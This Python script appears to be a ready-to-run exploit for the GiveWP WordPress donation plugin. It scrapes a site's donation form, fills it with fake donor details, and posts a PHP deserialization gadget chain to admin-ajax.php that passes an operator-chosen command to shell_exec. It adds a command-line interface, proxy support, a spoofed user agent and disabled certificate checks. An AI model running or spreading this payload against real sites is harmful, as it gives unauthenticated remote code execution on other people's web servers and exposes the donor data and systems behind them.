import requests
from bs4 import BeautifulSoup
from faker import Faker
from urllib.parse import urlparse
import random
import hashlib
import time
import sys
import re
import rich_click as click

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

class GiveWPExploit:

    def __init__(self, url: str, file: str, proxy: str = None):
        self.url = url
        self.file = file
        self.proxy = proxy

    def spinner(self, duration=10, interval=0.1) -> None:
        spinner_chars = ['|', '/', '-', '\\']
        end_time = time.time() + duration
        while time.time() < end_time:
            for char in spinner_chars:
                sys.stdout.write(f'\r[{char}] Exploit loading, please wait...')
                sys.stdout.flush()
                time.sleep(interval)
        print("")

    def getBaseUrl(self, url):
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        return base_url

    def getParams(self) -> dict:
        proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
        response = requests.get(self.url, verify=False, proxies=proxies)
        soup = BeautifulSoup(response.text, 'html.parser')

        give_form_id = soup.find('input', {'name': 'give-form-id'})['value']
        give_form_hash = soup.find('input', {'name': 'give-form-hash'})['value']
        button_tag = soup.find('button', {'data-price-id': True})
        give_price_id = button_tag['data-price-id']
        give_amount = button_tag.get_text(strip=True)

        fake = Faker()

        params = {
            "give-form-id": give_form_id,
            "give-form-hash": give_form_hash,
            "give-price-id": give_price_id,
            "give-amount": give_amount,
            "give_first": fake.first_name(),
            "give_last": fake.last_name(),
            "give_email": fake.email(),
        }

        return params

    def getData(self) -> dict:
        file = self.file
        rand_md5 = hashlib.md5(str(random.randint(0, 10)).encode()).hexdigest()
        payload = 'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:%d:"%s";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}' % (len(file), file)
        data = self.getParams()
        data['give_title'] = payload
        data['give-gateway'] = 'offline'
        data['action'] = 'give_process_donation'
        print(f"[+] Requested Data: ")
        print(data)
        return data

    def isEmbed(self, url: str) -> str:
        proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
        pattern = r'<iframe[\s\S]*?\bname="give-embed-form"[\s\S]*?>'
        response = requests.get(url, verify=False, proxies=proxies)
        match = re.search(pattern, response.text)
        if match:
            soup1 = BeautifulSoup(response.text, 'html.parser')
            embed_url = soup1.find('iframe')['src']
            return embed_url
        else:
            return url

    def sendRequest(self) -> None:
        fake = Faker()
        baseUrl = self.getBaseUrl(self.url)
        reqUrl = f"{baseUrl}/wp-admin/admin-ajax.php"
        data = self.getData()
        headers = {
            'User-Agent': fake.user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate, br'
        }
        proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
        response = requests.post(reqUrl, data=data, headers=headers, verify=False, proxies=proxies)

    def exploit(self) -> None:
        self.url = self.isEmbed(self.url)
        self.sendRequest()

@click.command()
@click.option(
    "-u",
    "--url",
    required=True,
    help="Specify a URL or domain for vulnerability detection (Donation-Form Page)",
)
@click.option(
    "-c",
    "--cmd",
    default="/tmp/test",
    help="Specify the file to read from the server",
)
@click.option(
    "-p",
    "--proxy",
    default=None,
    help="Specify the proxy to use for HTTP requests (e.g., http://ip:port)",
)

def main(url: str, cmd: str, proxy: str) -> None:
    cve_exploit = GiveWPExploit(url, cmd, proxy)
    cve_exploit.spinner(duration=1)
    cve_exploit.exploit()

if __name__ == "__main__":
    main()
